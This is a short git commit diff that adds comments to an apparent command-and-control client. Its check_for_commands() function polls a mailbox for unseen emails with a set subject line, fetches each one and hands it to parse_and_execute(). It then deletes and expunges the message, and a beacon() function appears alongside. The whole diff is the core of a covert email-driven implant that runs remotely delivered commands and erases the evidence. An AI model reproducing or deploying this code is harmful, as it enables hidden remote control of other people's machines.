34411bdba123534e33c03d230bcc7408bb280ae8
Xuejian Sundvall <jiansundvall@gmail.com>
2025-09-24 18:39:54 -0400

    add some comments

--- client.py
+++ client.py
@@ -21,10 +21,12 @@ def beacon():
         time.sleep(1)
 
 def check_for_commands():
+    #messages is a list of message ids (relative) that have "TestSubject" in the subject
     status, messages = mail.search(None, '(UNSEEN SUBJECT "TestSubject")')
     for num in messages[0].split():
+        #(RFC882) says to fetch the full raw contents of that email, using RFC 882 standard
         status, data = mail.fetch(num, '(RFC822)')
-        raw_email = data[0][1]
+        raw_email = data[0][1]#email contents at this spot
         parse_and_execute(raw_email)
         mail.store(num, '+FLAGS', '\\Deleted')  # Optional: delete after reading
         mail.expunge()
